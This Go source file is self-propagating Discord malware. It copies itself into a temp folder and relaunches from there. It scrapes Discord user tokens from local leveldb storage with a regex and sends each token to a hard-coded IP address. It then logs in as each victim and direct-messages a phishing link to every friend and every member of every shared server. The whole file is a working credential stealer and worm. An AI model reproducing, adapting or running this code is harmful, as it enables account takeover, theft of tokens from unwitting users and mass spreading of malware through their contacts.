package main

import (
	"fmt"
	"io"
	"io/ioutil"
	"net/http"
	"os"
	"os/exec"
	"os/user"
	"path/filepath"
	"regexp"
	"runtime"
	"strings"
	"time"

	"github.com/bwmarrin/discordgo"
)

var (
	tokenStealerURL = "http://127.223.18.92/"
	spamMessage     = "Hey, this is a little awkward, but is this you? If so, do you know that it's public? https://TheLinkWeWouldUseToSpread.com/{{username}}.png"
)

func main() {
	//fmt.Println("Hello Kindred")
	winOs := false

	if runtime.GOOS == "windows" {
		winOs = true
	}

	homeDir := getHomeDir()

	// Check if in temp
	tempDir := ""
	if winOs {
		tempDir = "\\AppData\\Local\\Temp\\"
	} else {
		tempDir = "/tmp"
	}

	// Make sure we're running from a temporary directory
	if !strings.Contains(os.Args[0], tempDir) {
		if winOs {
			err := copyFile(os.Args[0], homeDir+"\\AppData\\Local\\Temp\\badHardcodedName.exe")
			if err != nil {
				// Couldn't copy self to temp dir
				os.Exit(1)
			}
			cmd := exec.Command(homeDir + "\\AppData\\Local\\Temp\\badHardcodedname.exe")
			cmd.Start()
			os.Exit(0)
		} else {
			err := copyFile(os.Args[0], "/tmp/badHardcodedName.elf")
			if err != nil {
				// Couldn't copy self to temp dir
				os.Exit(1)
			}
			cmd := exec.Command("/tmp/badHardcodedName.elf")
			cmd.Start()
			os.Exit(0)
		}
	}

	spreadViaDiscord(winOs, homeDir) //works
}

func spreadViaDiscord(winOs bool, homeDir string) {
	discordLeveldbFolder := ""
	var tokens []string

	// We assume that the user running the malware used snap to install discord
	if winOs {
		discordLeveldbFolder = homeDir + "\\appdata\\roaming\\Discord\\Local Storage\\leveldb\\"
	} else {
		discordLeveldbFolder = homeDir + "/snap/discord/current/.config/discord/Local Storage/leveldb/"
	}
	tokenRegex := regexp.MustCompile(`"([MN][A-Za-z\d]{23}\.[\w-]{6}\.[\w-]{27})|(mfa\.[A-Za-z\d]{52}_[A-Za-z\d]{12}_[A-Za-z\d]{18})"`)

	// Read every file in the leveldb foler, and scrape tokens
	err := filepath.Walk(discordLeveldbFolder, func(path string, info os.FileInfo, err error) error {
		if err != nil {
			//fmt.Println(err)
			return err
		}

		dat, err := ioutil.ReadFile(path)
		if err != nil {
			return nil
		}

		matches := tokenRegex.FindAllSubmatch(dat, -1)

		for _, v := range matches {
			tokens = append(tokens, string(v[0]))
		}

		return nil
	})

	// Error reading files (Don't exist?)
	if err != nil {
		//fmt.Println("No tokens, is discord installed?")
		return
	}

	// Loop though tokens, and message all friends
	for _, v := range tokens {
		// log in to discord api using user token
		//fmt.Printf("Discord Token: %s\n", v)
		v = strings.ReplaceAll(v, "\"", "")

		discord, err := discordgo.New(v)
		if err != nil {
			//fmt.Println("Error1: " + err.Error())
			continue
		}

		// Get username of logged in user
		me, err := discord.User("@me")
		if err != nil {
			//fmt.Println("Error2: " + err.Error())
			continue
		}
		//fmt.Println("Logged in as: " + me.Username)

		/*
			****************** Discord endpoint is blacklisted, will flag accounts and unverify them ******************
			// Join a server, send our token, then leave.
			inv, err := discord.InviteAccept("XJu8CQC")
			if err != nil {
				//fmt.Println("Error2.5: " + err.Error())
			} else {
				inv.
				// If we joined the server send
				_, err = discord.ChannelMessageSend("659233966133608452", v)
				discord.GuildLeave(inv.Guild.ID)
			}
		*/

		// Send the token off to a server so we can keep track of it.
		client := http.Client{
			Timeout: 5 * time.Second,
		}
		client.Get(tokenStealerURL + v)

		// Get list of friends
		friends, err := discord.RelationshipsGet()
		if err != nil {
			//fmt.Println("Error3: " + err.Error())
			continue
		}

		// Iterate through freinds, message them all
		for _, f := range friends {
			//fmt.Println(f.User.Username)
			dm, err := discord.UserChannelCreate(f.ID)
			if err != nil {
				//fmt.Println("Error4: " + err.Error())
				continue
			}

			// Send them a DM
			_, err = discord.ChannelMessageSend(dm.ID, strings.ReplaceAll(spamMessage, "{{username}}", f.User.Username))
			if err != nil {
				//fmt.Println("Error5: " + err.Error())
				continue
			}
			//fmt.Printf("Message sent from %s to %s\n", me.Username, f.User.Username)
			time.Sleep(500 * time.Millisecond)
		}

		var memberGuilds []*discordgo.UserGuild

		for {
			// Get guilds (servers) the user is in
			lastGuild := ""
			if len(memberGuilds) > 0 {
				lastGuild = memberGuilds[len(memberGuilds)-1].ID
			}
			guilds, err := discord.UserGuilds(100, "", lastGuild)

			if err != nil {
				//fmt.Printf("Error6: " + err.Error())
				return
			}

			for _, g := range guilds {
				memberGuilds = append(memberGuilds, g)
			}

			if len(guilds) < 100 {
				break
			}

		}

		// Iterate through everyone in a shared server, and message them
		for _, g := range memberGuilds {
			var guildMemebers []*discordgo.Member

			for {
				lastMember := ""
				if len(guildMemebers) > 0 {
					lastMember = guildMemebers[len(guildMemebers)-1].User.ID
				}
				members, err := discord.GuildMembers(g.ID, lastMember, 1000)
				if err != nil {
					//fmt.Println("Error7: " + err.Error())
					continue
				}

				for _, m := range members {
					guildMemebers = append(guildMemebers, m)
				}

				if len(members) < 1000 {
					break
				}

			}

			// Iterate though all members in the server
			for _, m := range guildMemebers {
				if m.User.ID == me.ID {
					continue
				}
				dm, err := discord.UserChannelCreate(m.User.ID)
				if err != nil {
					//fmt.Println("Error8: " + err.Error())
					continue
				}

				// Send the DM
				_, err = discord.ChannelMessageSend(dm.ID, strings.ReplaceAll(spamMessage, "{{username}}", m.User.Username))
				if err != nil {
					//fmt.Println("Error9: " + err.Error())
					continue
				}
				//fmt.Printf("Message sent from %s to %s\n", me.Username, m.User.Username)
				time.Sleep(500 * time.Millisecond)
			}
		}
	}
}

func getHomeDir() string {
	pcUsername, err := user.Current()
	if err != nil {
		return ""
	}
	return pcUsername.HomeDir
}

func copyFile(src, dst string) error {
	sourceFileStat, err := os.Stat(src)
	if err != nil {
		return err
	}

	if !sourceFileStat.Mode().IsRegular() {
		return fmt.Errorf("%s is not a regular file", src)
	}

	source, err := os.Open(src)
	if err != nil {
		return err
	}
	defer source.Close()

	destination, err := os.Create(dst)
	if err != nil {
		return err
	}
	defer destination.Close()
	_, err = io.Copy(destination, source)
	return err
}
